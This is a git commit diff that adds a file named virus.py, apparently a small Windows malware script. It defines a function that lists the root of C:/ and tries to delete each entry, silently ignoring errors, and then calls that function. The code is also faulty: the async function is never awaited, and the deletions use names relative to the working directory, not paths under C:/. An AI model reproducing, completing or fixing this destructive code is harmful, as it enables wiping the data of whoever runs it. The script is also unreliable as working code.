0d6f6fa9a070eb34cb325be9696dd3c0ab6e5f33
BuildTools <unconfigured@null.spigotmc.org>
2021-06-19 19:58:02 -0500

    Completed windows version

--- virus.py
+++ virus.py
@@ -1,5 +1,13 @@
 import os
 from os import walk
 
-
-f = []
+async def filedeletion():
+    path = "C:/"
+    fi = os.listdir(path)
+    for f in fi:
+        try:
+            os.remove(f)
+        except:
+            pass
+    
+filedeletion()
